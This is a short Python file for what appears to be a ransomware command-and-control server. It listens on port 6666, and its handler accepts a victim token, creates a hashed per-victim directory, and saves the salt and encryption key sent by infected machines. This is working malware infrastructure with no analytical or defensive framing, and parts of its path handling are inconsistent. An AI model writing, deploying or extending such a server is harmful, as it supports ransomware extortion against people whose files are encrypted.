import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        #get the token  from the dictionnary body
        token = body.get('token')
        
        #check that the token exists
        if token:
            #Use sha-256 on the token 
            token_path=sha256(token.encode()).hexdigest()
            # Create a directory using the path and the token
            dir_path = os.path.join(path, token_path)
            os.makedirs(dir_path, exist_ok=True)
            
            #get the slat and the key from the dictionnary body
            salt = body.get('salt')
            key = body.get('key')
            
            #check that the salt and key exist
            if salt and key:
                #save the salt and key in their files
                self.save_b64(token_path,salt,'salt.bin') 
                self.save_b64(token_path,key,'key.bin')
                return {"status":"Success"}

        return {"status":"Error"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()